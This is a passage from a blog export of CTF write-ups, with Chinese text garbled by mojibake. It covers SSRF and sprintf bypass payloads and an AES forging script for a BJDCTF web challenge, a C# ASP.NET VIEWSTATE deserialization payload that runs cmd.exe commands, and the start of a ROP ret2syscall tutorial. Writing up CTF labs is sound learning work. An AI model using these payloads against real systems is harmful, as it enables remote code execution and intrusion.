class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if (!isset($_COOKIE[&#39;y1ng&#39;]) || $_COOKIE[&#39;y1ng&#39;] !&#x3D;&#x3D; sha1(md5(&#39;y1ng&#39;)))&#123;</span><br><span class="line">    echo &quot;&lt;script&gt;alert(&#39;why you are here!&#39;);alert(&#39;fxck your scanner&#39;);alert(&#39;fxck you! get out!&#39;);&lt;&#x2F;script&gt;&quot;;</span><br><span class="line">    header(&quot;Refresh:0.1;url&#x3D;index.php&quot;);</span><br><span class="line">    die;</span><br><span class="line">&#125;</span><br><span class="line">&lt;?php</span><br><span class="line">$filter1 &#x3D; &#39;&#x2F;^http:\&#x2F;\&#x2F;127\.0\.0\.1\&#x2F;&#x2F;i&#39;;</span><br><span class="line">$filter2 &#x3D; &#39;&#x2F;.?f.?l.?a.?g.?&#x2F;i&#39;;</span><br><span class="line">if (isset($_POST[&#39;q1&#39;]) &amp;&amp; isset($_POST[&#39;q2&#39;]) &amp;&amp; isset($_POST[&#39;q3&#39;]) ) &#123;</span><br><span class="line">    $url &#x3D; $_POST[&#39;q2&#39;].&quot;.y1ng.txt&quot;;</span><br><span class="line">    $method &#x3D; $_POST[&#39;q3&#39;];</span><br><span class="line"></span><br><span class="line">    $str1 &#x3D; &quot;~$ python fuck.py -u \&quot;&quot;.$url .&quot;\&quot; -M $method -U y1ng -P admin123123 --neglect-negative --debug --hint&#x3D;xiangdemei&lt;br&gt;&quot;;</span><br><span class="line"></span><br><span class="line">    echo $str1;</span><br><span class="line"></span><br><span class="line">    if (!preg_match($filter1, $url) )&#123;</span><br><span class="line">        die($str2);</span><br><span class="line">    &#125;</span><br><span class="line">    if (preg_match($filter2, $url)) &#123;</span><br><span class="line">        die($str3);</span><br><span class="line">    &#125;</span><br><span class="line">    if (!preg_match(&#39;&#x2F;^GET&#x2F;i&#39;, $method) &amp;&amp; !preg_match(&#39;&#x2F;^POST&#x2F;i&#39;, $method)) &#123;</span><br><span class="line">        die($str4);</span><br><span class="line">    &#125;</span><br><span class="line">    $detect &#x3D; @file_get_contents($url, false);</span><br><span class="line">    print(sprintf(&quot;$url method&amp;content_size:$method%d&quot;, $detect));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>ç”¨åŒæ ·çš„æ–¹æ³•æ ¹æ®robots.txtçš„æç¤ºè¯»å–home.phpæºä»£ç ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">setcookie(&quot;y1ng&quot;, sha1(md5(&#39;y1ng&#39;)), time() + 3600);</span><br><span class="line">setcookie(&#39;your_ip_address&#39;, md5($_SERVER[&#39;REMOTE_ADDR&#39;]), time()+3600);</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#39;file&#39;]))&#123;</span><br><span class="line">    if (preg_match(&quot;&#x2F;\^|\~|&amp;|\|&#x2F;&quot;, $_GET[&#39;file&#39;])) &#123;</span><br><span class="line">        die(&quot;forbidden&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(preg_match(&quot;&#x2F;.?f.?l.?a.?g.?&#x2F;i&quot;, $_GET[&#39;file&#39;]))&#123;</span><br><span class="line">        die(&quot;not now!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(preg_match(&quot;&#x2F;.?a.?d.?m.?i.?n.?&#x2F;i&quot;, $_GET[&#39;file&#39;]))&#123;</span><br><span class="line">        die(&quot;You! are! not! my! admin!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(preg_match(&quot;&#x2F;^home$&#x2F;i&quot;, $_GET[&#39;file&#39;]))&#123;</span><br><span class="line">        die(&quot;ç¦æ­¢å¥—å¨ƒ&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    else&#123;</span><br><span class="line">        if(preg_match(&quot;&#x2F;home$&#x2F;i&quot;, $_GET[&#39;file&#39;]) or preg_match(&quot;&#x2F;system$&#x2F;i&quot;, $_GET[&#39;file&#39;]))&#123;</span><br><span class="line">            $file &#x3D; $_GET[&#39;file&#39;].&quot;.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            $file &#x3D; $_GET[&#39;file&#39;].&quot;.fxxkyou!&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        echo &quot;ç°åœ¨è®¿é—®çš„æ˜¯ &quot;.$file . &quot;&lt;br&gt;&quot;;</span><br><span class="line">        require $file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    echo &quot;&lt;script&gt;location.href&#x3D;&#39;.&#x2F;home.php?file&#x3D;system&#39;&lt;&#x2F;script&gt;&quot;;</span><br></pre></td></tr></table></figure><p>å¯¹system.phpè¿›è¡Œä»£ç å®¡è®¡å‘ç°ä¼ å…¥çš„urlå¿…é¡»æ˜¯<a href="http://127.0.0.1/å¼€å¤´ï¼Œä¸”ä¸èƒ½åŒ…å«flagå…³é”®å­—" target="_blank" rel="noopener">http://127.0.0.1/å¼€å¤´ï¼Œä¸”ä¸èƒ½åŒ…å«flagå…³é”®å­—</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$filter1 &#x3D; &#39;&#x2F;^http:\&#x2F;\&#x2F;127\.0\.0\.1\&#x2F;&#x2F;i&#39;;</span><br><span class="line">$filter2 &#x3D; &#39;&#x2F;.?f.?l.?a.?g.?&#x2F;i&#39;;</span><br><span class="line">if (!preg_match($filter1, $url) )&#123;</span><br><span class="line">        die($str2);</span><br><span class="line">&#125;</span><br><span class="line">if (preg_match($filter2, $url)) &#123;</span><br><span class="line">        die($str3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åŒæ—¶è¿›è¡Œå†…ç½‘è®¿é—®çš„æ—¶å€™urlä¼šè¢«åœ¨åé¢æ‹¼æ¥ä¸Šä¸€ä¸ªy1ng.txtçš„åç¼€ï¼Œè®¿é—®çš„æ–¹æ³•å¿…é¡»æ˜¯GETæˆ–è€…POSTå¼€å¤´ï¼Œä½†æ˜¯æ²¡æœ‰åˆ¤æ–­ç»“å°¾ï¼Œç„¶åç”¨æ ¼å¼åŒ–è¾“å‡ºæ–‡ä»¶çš„å†…å®¹ï¼Œå­˜åœ¨æ ¼å¼åŒ–æ¼æ´ã€‚</p><p>ç¬¬ä¸€å¤„æˆ‘ä»¬å¯ä»¥ä¼ å…¥å‚æ•°ç»•è¿‡ï¼Œç¬¬äºŒå¤„æˆ‘ä»¬å¯ä»¥ä¼ å…¥GET%s%æŠŠ%dè½¬ä¹‰æ‰ï¼Œå®Œæ•´payloadå¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">q1&#x3D;s&amp;q2&#x3D;http:&#x2F;&#x2F;127.0.0.1&#x2F;admin.php?a&#x3D;1&amp;q3&#x3D;GET%s%</span><br></pre></td></tr></table></figure><p>è®¿é—®å¾—åˆ°admin.phpæºä»£ç ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line">session_start();</span><br><span class="line">$f1ag &#x3D; &#39;f1ag&#123;s1mpl3_SSRF_@nd_spr1ntf&#125;&#39;; &#x2F;&#x2F;fake</span><br><span class="line"></span><br><span class="line">function aesEn($data, $key)</span><br><span class="line">&#123;</span><br><span class="line">    $method &#x3D; &#39;AES-128-CBC&#39;;</span><br><span class="line">    $iv &#x3D; md5($_SERVER[&#39;REMOTE_ADDR&#39;],true);</span><br><span class="line">    return  base64_encode(openssl_encrypt($data, $method,$key, OPENSSL_RAW_DATA , $iv));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function Check()</span><br><span class="line">&#123;</span><br><span class="line">    if (isset($_COOKIE[&#39;your_ip_address&#39;]) &amp;&amp; $_COOKIE[&#39;your_ip_address&#39;] &#x3D;&#x3D;&#x3D; md5($_SERVER[&#39;REMOTE_ADDR&#39;]) &amp;&amp; $_COOKIE[&#39;y1ng&#39;] &#x3D;&#x3D;&#x3D; sha1(md5(&#39;y1ng&#39;)))</span><br><span class="line">        return true;</span><br><span class="line">    else</span><br><span class="line">        return false;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ( $_SERVER[&#39;REMOTE_ADDR&#39;] &#x3D;&#x3D; &quot;127.0.0.1&quot; ) &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    echo &quot;&lt;head&gt;&lt;title&gt;403 Forbidden&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;&lt;body bgcolor&#x3D;black&gt;&lt;center&gt;&lt;font size&#x3D;&#39;10px&#39; color&#x3D;white&gt;&lt;br&gt;only 127.0.0.1 can access! You know what I mean right?&lt;br&gt;your ip address is &quot; . $_SERVER[&#39;REMOTE_ADDR&#39;];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$_SESSION[&#39;user&#39;] &#x3D; md5($_SERVER[&#39;REMOTE_ADDR&#39;]);</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#39;decrypt&#39;])) &#123;</span><br><span class="line">    $decr &#x3D; $_GET[&#39;decrypt&#39;];</span><br><span class="line">    if (Check())&#123;</span><br><span class="line">        $data &#x3D; $_SESSION[&#39;secret&#39;];</span><br><span class="line">        include &#39;flag_2sln2ndln2klnlksnf.php&#39;;</span><br><span class="line">        $cipher &#x3D; aesEn($data, &#39;y1ng&#39;);</span><br><span class="line">        if ($decr &#x3D;&#x3D;&#x3D; $cipher)&#123;</span><br><span class="line">            echo WHAT_YOU_WANT;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            die(&#39;çˆ¬&#39;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else&#123;</span><br><span class="line">        header(&quot;Refresh:0.1;url&#x3D;index.php&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    &#x2F;&#x2F;I heard you can break PHP mt_rand seed</span><br><span class="line">    mt_srand(rand(0,9999999));</span><br><span class="line">    $length &#x3D; mt_rand(40,80);</span><br><span class="line">    $_SESSION[&#39;secret&#39;] &#x3D; bin2hex(random_bytes($length));</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>åˆ†æadmin.php,å‘ç°éœ€è¦éªŒè¯åŠ å¯†çš„ç»“æœä¸€è‡´ï¼Œæ‰èƒ½å¾—åˆ°flagã€‚é¢˜ç›®çš„åŠ å¯†æ— æ³•ç ´è§£ï¼Œä½†æ˜¯å­˜åœ¨é€»è¾‘Bugï¼Œåªè¦é€šè¿‡åˆ é™¤PHPSESSIDå°†SESSIONç½®ç©ºï¼Œå°±å°†<code>$data</code>ç½®ç©ºäº†ï¼Œè¿™æ ·AESåŠ å¯†çš„å…¶ä»–å‚æ•°å°±éƒ½æ˜¯å·²çŸ¥çš„äº†ï¼Œå°±å¯ä»¥è‡ªå·±ç®—å‡ºå¯†æ–‡äº†ï¼ŒåŠ å¯†è„šæœ¬å¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function aesEn($data, $key)</span><br><span class="line">&#123;</span><br><span class="line">    $method &#x3D; &#39;AES-128-CBC&#39;;</span><br><span class="line">    $iv &#x3D; md5(&#39;174.0.222.75&#39;,true);</span><br><span class="line">    return  base64_encode(openssl_encrypt($data, $method,$key, OPENSSL_RAW_DATA , $iv));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$cipher &#x3D; aesEn(null, &#39;y1ng&#39;);</span><br><span class="line">echo $cipher;</span><br></pre></td></tr></table></figure><p>å°†ç»“æœä¼ ç»™decryptï¼Œç„¶ååˆ æ‰PHPSESSIDï¼Œå¾—åˆ°flagï¼Œ<strong>æ³¨æ„ç»“æœä¸­å­˜åœ¨åŠ å·ï¼Œéœ€è¦urlç¼–ç åä¼ å‚</strong>ï¼Œè¿™è¾¹å¯ä»¥å€Ÿé‰´ä½¿ç”¨ä¸€ä½å¸ˆå‚…çš„è„šæœ¬å‘åŒ…</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;python3</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">s &#x3D; requests.session()</span><br><span class="line"></span><br><span class="line">cipher &#x3D; &#39;70klfZeYC%2bWlC045CcKhtg&#x3D;&#x3D;&#39; # åˆšåˆšç”Ÿæˆçš„cipher</span><br><span class="line"></span><br><span class="line">s.cookies.set(&#39;your_ip_address&#39;, &#39;76d9f00467e5ee6abc3ca60892ef304e&#39;) # ä½ çš„IPçš„MD5</span><br><span class="line">s.cookies.set(&#39;y1ng&#39;, &#39;8880cbd71721332a25aa6df7b12eb7ac53539100&#39;)</span><br><span class="line"></span><br><span class="line">print(s.post(f&#39;http:&#x2F;&#x2F;7a66a822-c9b0-4def-9b00-a476088c425f.node3.buuoj.cn&#x2F;admin.php?decrypt&#x3D;&#123;cipher&#125;&#39;,).text)</span><br></pre></td></tr></table></figure><blockquote><p>å‚è€ƒèµ„æ–™ï¼š</p><p><a href="https://zhuanlan.zhihu.com/p/115462788" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/115462788</a></p><p><a href="https://www.gem-love.com/ctf/2097.html#File_Detect" target="_blank" rel="noopener">https://www.gem-love.com/ctf/2097.html#File_Detect</a></p></blockquote><h3 id="0x-10-EasyAspDotNet"><a href="#0x-10-EasyAspDotNet" class="headerlink" title="0x 10 EasyAspDotNet"></a>0x 10 EasyAspDotNet</h3><ul><li><p>è€ƒç‚¹</p><p>ä»»æ„æ–‡ä»¶è¯»å–ã€ASP.NET  VIEWSTATE ååºåˆ—åŒ–æœ‰å›æ˜¾ RCEã€Windows åŸºæœ¬æ“ä½œ</p></li><li><p>è§£é¢˜è¿‡ç¨‹</p></li></ul><ol><li>æ‰“å¼€é¡µé¢æœ‰ä¸€ä¸ªç‚¹å‡»æŒ‰é’®ï¼Œç‚¹å‡»ä¼šç”Ÿæˆä¸€å¼ å›¾ç‰‡ï¼ŒæŸ¥çœ‹é¡µé¢å…ƒç´ ï¼Œæ€€ç–‘æœ‰æ–‡ä»¶è¯»å–</li></ol><p><img src="/2020/03/21/BJDCTF-2nd%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200324114119983.png" alt></p><ol start="2"><li>æ ¹æ®urlä¸­çš„ .aspx åç¼€ï¼Œå°è¯•è¯»å– web.config æ–‡ä»¶</li></ol><p><img src="/2020/03/21/BJDCTF-2nd%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200324114358122.png" alt></p><p><img src="/2020/03/21/BJDCTF-2nd%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200324114429815.png" alt></p><ol start="3"><li>æ ¹æ®è¿™ä¸¤ç¯‡æ–‡ç« æ‰€è¿°</li></ol><p><a href="https://devco.re/blog/2020/03/11/play-with-dotnet-viewstate-exploit-and-create-fileless-webshell/" target="_blank" rel="noopener">ç©è½‰ ASP.NET VIEWSTATE ååºåˆ—åŒ–æ”»æ“Šã€å»ºç«‹ç„¡æª”æ¡ˆå¾Œé–€</a></p><p><a href="https://www.4hou.com/posts/GYq7" target="_blank" rel="noopener">å¦‚ä½•å€ŸåŠ©ViewStateåœ¨ASP.NETä¸­å®ç°ååºåˆ—åŒ–æ¼æ´åˆ©ç”¨</a></p><p>æ„é€ ä¸€ä¸ªå¸¦å›æ˜¾çš„ VIEWSTATE Payloadï¼Œæ¥è®©æœåŠ¡å™¨ååºåˆ—åŒ–ç„¶å RCEã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">class E</span><br><span class="line">&#123;</span><br><span class="line">    public E()</span><br><span class="line">    &#123;</span><br><span class="line">        System.Web.HttpContext context &#x3D; System.Web.HttpContext.Current;</span><br><span class="line">        context.Server.ClearError();</span><br><span class="line">        context.Response.Clear();</span><br><span class="line">        try</span><br><span class="line">        &#123;</span><br><span class="line">            System.Diagnostics.Process process &#x3D; new System.Diagnostics.Process();</span><br><span class="line">            process.StartInfo.FileName &#x3D; &quot;cmd.exe&quot;;</span><br><span class="line">            string cmd &#x3D; context.Request.Form[&quot;cmd&quot;];</span><br><span class="line">            process.StartInfo.Arguments &#x3D; &quot;&#x2F;c &quot; + cmd;</span><br><span class="line">            process.StartInfo.RedirectStandardOutput &#x3D; true;</span><br><span class="line">            process.StartInfo.RedirectStandardError &#x3D; true;</span><br><span class="line">            process.StartInfo.UseShellExecute &#x3D; false;</span><br><span class="line">            process.Start();</span><br><span class="line">            string output &#x3D; process.StandardOutput.ReadToEnd();</span><br><span class="line">            context.Response.Write(output);</span><br><span class="line">        &#125; catch (System.Exception) &#123;&#125;</span><br><span class="line">        context.Response.Flush();</span><br><span class="line">        context.Response.End();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œéœ€è¦å¼•å…¥System.dllå’ŒSystem.Web.dllä¸¤ä¸ªåº“ï¼Œç”Ÿæˆpayloadå¦‚ä¸‹ï¼š</p><p><img src="/2020/03/21/BJDCTF-2nd%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/BJDCTF-2nd%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95%5Cimage-20200324115344089.png" alt></p><p>å°†payloadè¿›è¡Œurlç¼–ç åç”¨burpå‘é€æµ‹è¯•æˆåŠŸ</p><p><img src="/2020/03/21/BJDCTF-2nd%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200324120841201.png" alt></p><p>è·å¾—flagï¼š</p><p><img src="/2020/03/21/BJDCTF-2nd%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200324121000106.png" alt></p><p>è¡¥å……ï¼š<a href="http://viewstatedecoder.azurewebsites.net/" target="_blank" rel="noopener">è§£ç ViewStateçš„ç½‘ç«™</a></p>]]></content>
      
      
      <categories>
          
          <category> ctfwp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BJDCTF 2nd </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ROP-Ret2SyscallåŸç†åŠåº”ç”¨</title>
      <link href="/2020/03/20/ROP-Ret2Syscall%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/"/>
      <url>/2020/03/20/ROP-Ret2Syscall%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h3 id="0x-01-ROP-Ret2SyscallåŸç†"><a href="#0x-01-ROP-Ret2SyscallåŸç†" class="headerlink" title="0x 01 ROP-Ret2SyscallåŸç†"></a>0x 01 ROP-Ret2SyscallåŸç†</h3><p>ROP-Ret2Syscallæ„æ€æ˜¯è°ƒç”¨ç³»ç»Ÿå‡½æ•°æ¥è·å–shell.</p><p>è¿™é‡Œåœ¨è®²ä¸¤ä¸ªæ¦‚å¿µï¼šç¬¬ä¸€ï¼šROP(Return-oriented programming),æ˜¯ä¸€ç§åŸºäºä»£ç å¤ç”¨æŠ€æœ¯çš„æ–°å‹<strong><em>ï¼Œ</em></strong>è€…ä¾›å·²æœ‰çš„åº“æˆ–å¯æ‰§è¡Œæ–‡ä»¶ä¸­æå–æŒ‡ä»¤ç‰‡æ®µã€æ„å»ºæ¶æ„ä»£ç ã€‚</p><p>ç¬¬äºŒï¼šGadgetsæ˜¯æŒ‡åœ¨ç¨‹åºä¸­çš„æŒ‡ä»¤ç‰‡æ®µï¼Œæœ‰æ—¶æˆ‘ä»¬ä¸ºäº†è¾¾åˆ°æˆ‘ä»¬æ‰§è¡Œå‘½ä»¤çš„ç›®çš„ï¼Œéœ€è¦å¤šä¸ªGadgetæ¥å®Œæˆæˆ‘ä»¬çš„åŠŸèƒ½ã€‚Gadgetæœ€åä¸€èˆ¬éƒ½æœ‰ret,å› ä¸ºè¦è®²ç¨‹åºæ§åˆ¶æƒ(ip)ç»™ä¸‹ä¸€ä¸ªGadgetã€‚</p><h3 id="0x-02-å®ä¾‹åˆ†æ"><a href="#0x-02-å®ä¾‹åˆ†æ" class="headerlink" title="0x 02 å®ä¾‹åˆ†æ"></a>0x 02 å®ä¾‹åˆ†æ</h3><ol><li>ä¼ªä»£ç </li></ol><p><img src="/2020/03/20/ROP-Ret2Syscall%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/image-20200121225903103.png" alt></p><p>ç¬¬å…«è¡Œé‡Œåˆä¸€ä¸ªgetså‡½æ•°æ˜¯æœ‰æº¢å‡ºæ¼æ´çš„,ä½¿ç”¨gdbé‡Œçš„pattern offsetæ¥è·å–æº¢å‡ºåç§»é‡ä¸º112</p><ol start="2"><li><p>æˆ‘ä»¬çŸ¥é“æº¢å‡ºåç§»é‡äº†ï¼Œç°åœ¨æˆ‘ä»¬æƒ³æ‰§è¡Œå‘½ä»¤ï¼Œä¾‹å¦‚execve(â€œ/bin/shâ€,null,null)ã€‚æ­¤æ—¶è¦è®¾è®¡åˆ°Linuxåœ¨è°ƒç”¨ç³»ç»Ÿå‡½æ•°æ—¶çš„ç”¨æ³•ã€‚</p><p>ç³»ç»Ÿå‡½æ•°è°ƒç”¨çš„æŒ‡ä»¤æ˜¯int 0x80,è¿™æ˜¯å›ºå®šæŒ‡ä»¤ï¼Œä»–æœ‰å››ä¸ªå‚æ•°ï¼š</p><ul><li>ç³»ç»Ÿè°ƒç”¨å·ï¼Œå³ eax åº”è¯¥ä¸º 0xb</li><li>ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œå³ ebx åº”è¯¥æŒ‡å‘ /bin/sh çš„åœ°å€ï¼Œå…¶å®æ‰§è¡Œ sh çš„åœ°å€ä¹Ÿå¯ä»¥ã€‚</li><li>ç¬¬äºŒä¸ªå‚æ•°ï¼Œå³ ecx åº”è¯¥ä¸º 0</li><li>ç¬¬ä¸‰ä¸ªå‚æ•°ï¼Œå³ edx åº”è¯¥ä¸º 0</li></ul><p>å¦‚æœä½ å­¦è¿‡ä»»æ„ä¸€é—¨ç¼–ç¨‹è¯­è¨€ï¼Œå¯ä»¥ç†è§£ä¸ºint  0x80(eax,ebx,ecx,edx)ã€‚å¯èƒ½ä¼šæœ‰è¿™æ ·çš„ç–‘é—®ï¼šä¸ºä»€ä¹ˆæ˜¯eax,ebx,ecx,edxè¦è®¾ç½®ä¸ºè¿™äº›å€¼ï¼Œç­”æ¡ˆæ˜¯ç³»ç»Ÿåœ¨è¿è¡Œçš„æ—¶å€™å°±æ˜¯å›ºå®šçš„è¦è¯»è¿™å››ä¸ªå¯„å­˜å™¨ï¼Œå¦‚æœä¸è¿™ä¹ˆå†™ï¼Œå°±ä¸ä¼šè°ƒç”¨åˆ°execveå‡½æ•°ã€‚</p><p>æ¥ä¸‹æ¥æˆ‘ä»¬å°±è¦ä¸€ç‚¹ç‚¹çš„å»æ‹¼å‡‘è¿™äº›å†…å®¹ï¼Œæˆ‘ä»¬æ²¡æ³•ç›´æ¥åœ¨æ ˆé‡Œå†™æŒ‡ä»¤ï¼Œåªèƒ½å¤Ÿåˆ©ç”¨ç¨‹åºä¸­è‡ªå¸¦çš„æŒ‡ä»¤å»æ‹¼å‡‘ã€‚</p><p>é¦–å…ˆæˆ‘ä»¬å°†eaxè®¾ç½®ä¸º0xbï¼Œæˆ‘ä»¬æ˜¯æ²¡æ³•ç›´æ¥å¾€æ ˆé‡Œå†™mov eax,0xbçš„ï¼Œé‚£ä¹ˆè¿˜æœ‰å¦ä¸€ç§æ–¹å¼æ˜¯pop eaxï¼Œä½†æ˜¯è¦ä¿è¯æ ˆé¡¶å¿…é¡»æ˜¯0xbã€‚</p><p>ç„¶åè®¾ç½®ebx,ecx,edxï¼ŒåŒæ ·æ˜¯è¿™æ ·çš„é“ç†ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æƒ³è±¡æ ˆä¸­çš„æ•°æ®æ˜¯ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pop eaxï¼›ret</span><br><span class="line">0xb</span><br><span class="line">pop ebx;pop ecx;pop edx;ret</span><br><span class="line">&quot;&#x2F;bin&#x2F;sh&quot;çš„åœ°å€</span><br><span class="line">0</span><br><span class="line">0</span><br><span class="line">int 0x80çš„åœ°å€</span><br></pre></td></tr></table></figure><p>è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥ä¿å€¼eaxï¼Œebxï¼Œecxï¼Œedxçš„å€¼äº†ã€‚</p><p>æ‰€ä»¥æ¥ä¸‹æ¥æˆ‘ä»¬è¦åœ¨ç¨‹åºä¸­æ‰¾ä¸€ä¸‹æœ‰æ²¡æœ‰pop eax;å’Œpop ebx;pop ecx;pop edx;çš„æŒ‡ä»¤ã€‚</p><p>éœ€è¦ç”¨åˆ°ä¸€ä¸ªå·¥å…·ï¼šROPgadget</p><p>ROPgadget â€“binary ./ret2syscall â€“only â€œpop|retâ€ | grep â€œeaxâ€</p><p>â€“onlyæ˜¯æŒ‡åªæœ‰popå’ŒretæŒ‡ä»¤</p></li></ol><p><img src="/2020/03/20/ROP-Ret2Syscall%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/image-20200121230259021.png" alt></p><p>æˆ‘ä»¬ä½¿ç”¨0x080bb196ï¼Œç¬¦åˆæˆ‘ä»¬çš„é¢„æœŸã€‚</p><p>æ¥ä¸‹æ¥æ‰¾ç±»ä¼¼pop ebx;pop ecx;pop edx;çš„æŒ‡ä»¤</p><p>ROPgadget â€“binary ./ret2syscall â€“only â€œpop|retâ€ | grep â€œebxâ€ | grep â€œecxâ€ | grep â€œedxâ€</p><p><img src="/2020/03/20/ROP-Ret2Syscall%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/image-20200121230412710.png" 